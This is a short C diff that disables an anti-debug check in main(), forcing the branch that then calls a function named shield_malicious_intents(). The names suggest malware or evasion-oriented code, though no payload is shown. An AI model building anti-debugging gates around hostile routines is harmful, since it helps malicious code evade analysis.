@@ -85,7 +85,8 @@ int	main(void)
 			return (1);
 		}
 	}
-	if (shield_antidebug())
+	// if (shield_antidebug())
+	if (1)
 	{
 		DEBUG("passed anti-debug check\n");
 		shield_malicious_intents();
